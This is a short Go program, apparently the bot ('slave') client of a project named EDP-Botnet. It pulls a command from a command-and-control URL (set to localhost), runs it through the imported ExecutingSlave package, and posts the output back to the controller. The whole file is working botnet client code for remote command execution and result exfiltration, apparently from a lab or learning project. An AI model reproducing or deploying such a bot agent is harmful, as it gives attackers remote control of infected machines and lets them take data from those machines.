package main

import (
	"log"
	"os"

	slave "github.com/grisufrj/EDP-Botnet/ExecutingSlave"
)

func main() {
	l := log.New(os.Stdout, "slave-logger", log.LstdFlags)
	s := slave.NewSlave(l)
	url := "http://localhost:5000"
	comando := s.RecvCmd(url + "/command")
	resp := s.ExecCmd(comando)
	respStatus := s.SendCmd(url+"/send", resp.Bytes())

	log.Println(respStatus)
}
